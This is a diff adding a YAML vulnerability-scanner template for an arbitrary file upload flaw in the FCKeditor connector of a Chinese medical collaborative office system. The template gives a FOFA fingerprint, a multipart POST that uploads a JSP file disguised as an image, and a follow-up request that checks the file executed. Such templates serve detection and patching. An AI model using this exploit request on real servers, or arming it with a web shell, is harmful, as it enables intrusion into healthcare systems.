@@ -1,0 +1,46 @@
+id: poc-yaml-donghua-mediway-oa-connector-anyfile-upload
+info:
+  name: 东华医疗协同办公系统 connector 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 东华医疗协同办公系统
+  fofa: body="/skin/charmBlue/css/dialog.css"
+variables:
+  random: random_str(6)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type&CurrentFolder=/
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
+  data: '------WebKitFormBoundaryt1qdEWTI01cj5BLV
+
+    Content-Disposition: form-data; name="NewFile"; filename="{{.random}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.println("{{.content}}"); %>
+
+    ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+
+    Content-Disposition: form-data; name="Submit"
+
+
+    upload
+
+    ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
+
+    '
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /common/FCKeditor/UserFiles/{{.random}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
